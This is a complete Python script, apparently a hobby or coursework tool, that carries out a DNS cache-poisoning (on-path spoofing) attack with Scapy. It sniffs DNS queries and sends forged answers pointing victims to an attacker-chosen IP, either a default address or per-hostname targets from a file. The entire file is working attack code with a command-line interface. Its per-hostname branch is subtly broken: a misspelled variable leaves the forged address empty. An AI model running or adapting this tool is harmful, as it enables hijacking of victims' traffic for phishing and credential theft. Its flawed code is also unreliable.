#DNS Poisoner (on path attack) using Scapy Framework. Python 3.

import argparse
import socket
from scapy.all import *

#SET DEFAULT DST HERE IF NOT SPECIFYING HOSTNAMES FILE
defaultDst = '10.0.2.15'.encode('UTF-8')
hostnames = None

def sniffLive(interfaceName, bpf):
    print('Sniffing live with bpf:{} in interface:{}\n'.format(bpf, interfaceName))
    sniff(prn=processPacket, filter=bpf, iface=interfaceName, store=0)
    return 0 

# Returns True if is targettable DNS request
def isRelevant(pkt):
    retval = True

    #test if packet is DNS request
    if (not pkt.haslayer(DNS) or not pkt[DNS].qr == 0):
        return False

    #test if packet hostname matches a specified hostname
    if not hostnames == None:
        retval = pkt[DNS].qd.qname in hostnames
    return retval


#given dns query: pkt, and ip fakeDst
#returns dns response pkt pointing to fakeDst
def forgeResponse(pkt, fakeDst):
    fResponse = Ether()/IP()/UDP()/DNS(pkt[DNS])

    fResponse[DNS].qr = 1
    fResponse[DNS].ra = 1
    fResponse[DNS].ancount = 1
    rD = scapy.layers.dns.DNSRR(rrname=pkt[DNS].qd.qname, type='A', rclass ='IN', ttl=50000, rdata=fakeDst)
    fResponse[DNS].an = rD

    fResponse[UDP].dport = pkt[UDP].sport
    fResponse[UDP].sport = pkt[UDP].dport

    fResponse[IP].dst = pkt[IP].src
    fResponse[IP].src = pkt[IP].dst
       
    fResponse[Ether].dst = pkt[Ether].src
    fResponse[Ether].src = pkt[Ether].dst

    return fResponse

def processPacket(pkt):
    if(isRelevant(pkt)):
        #print(pkt[DNS].summary())
        #pkt[DNS].show2()

        #identify redirect destination (current machine or other specified ip)
        fakeDst = ''
        if hostnames == None:
            fakeDst = defaultDst
        else:
            fakeDest = hostnames[pkt[DNS].qd.qname]

        #forge response packet
        fResponse = forgeResponse(pkt, fakeDst)

        print('Victim request:')
        print(pkt.summary())
        print('Forged response:')
        print(fResponse.summary())

        #send forged packet
        send(fResponse[IP])
        print()

    else:
        return
    return

#loads hostname ip pairs from hostname file into dict
def loadHostnamesFile(hostnamesFile):
    if not os.path.exists(hostnamesFile):
        print('ERROR: Specified hostname file not found')
        exit(1)

    global hostnames
    hostnames = {}

    pattern = r'''(\S+)\s+(\S+)'''

    with open(hostnamesFile, 'r') as input:
        for line in input:
            m = re.match(pattern, line)

            currentHostname, currentIP = m.groups()

            currentHostname = currentHostname.encode('utf-8')
            currentIP = currentIP.encode('utf-8')

            print('h:{}, ip:{}'.format(currentHostname, currentIP))

            #check if hostname already loaded, if not, add to dict.
            if currentHostname in hostnames:
                print('ERROR: only one line per hostname')
                exit(1)
            else:
                hostnames[currentHostname] = currentIP
    return True

def main():
    print('Starting dnspoison.py')
    
    #parse args
    # dnspoison.py [-i interface] [-f hostnames] [-e expression]
    parser = argparse.ArgumentParser()

    parser.add_argument('-i', nargs='?', \
            choices=[x[1] for x in socket.if_nameindex()], metavar='interfaceName', \
            help='specify interface to sniff packets on. Automatically picks if none specified.')
    
    #implement an array of options
    parser.add_argument('-f', metavar='hostnames.txt', \
      help='specify hostname ip pairs to hijack. 1 pair per line, separated by whitepace')

    parser.add_argument('-e', metavar='BPF', help='specify BPF expression')
    
    parsed = parser.parse_args()

    print(parsed)
  
    if parsed.i == None:
        interface = socket.if_nameindex()[0][1]
    else:
        interface = parsed.i
    
    if not parsed.f == None:
        loadHostnamesFile(parsed.f)

    sniffLive(interface, parsed.e)

    return

if __name__ == "__main__":
   main()





